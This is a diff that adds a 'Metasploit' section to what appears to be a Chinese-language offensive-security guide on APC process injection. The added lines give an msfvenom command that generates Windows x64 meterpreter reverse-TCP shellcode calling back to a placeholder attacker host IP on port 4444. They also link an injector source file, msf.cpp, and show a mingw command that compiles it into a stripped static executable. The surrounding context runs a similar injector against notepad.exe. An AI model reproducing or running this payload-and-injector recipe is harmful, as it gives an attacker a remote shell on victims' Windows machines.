@@ -419,3 +419,17 @@ x86_64-w64-mingw32-g++ -O2 rev.cpp -o rev.exe -mconsole -I /usr/share/mingw-w64/
 ```powershell
 .\rev.exe notepad.exe
 ```
+
+### Metasploit
+
+Shellcode
+```Bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=攻击者主机IP地址 LPORT=4444 -f c
+```
+
+[msf.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/APC/msf.cpp)
+
+编译
+```Bash
+x86_64-w64-mingw32-g++ -O2 msf.cpp -o msf.exe -mconsole -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
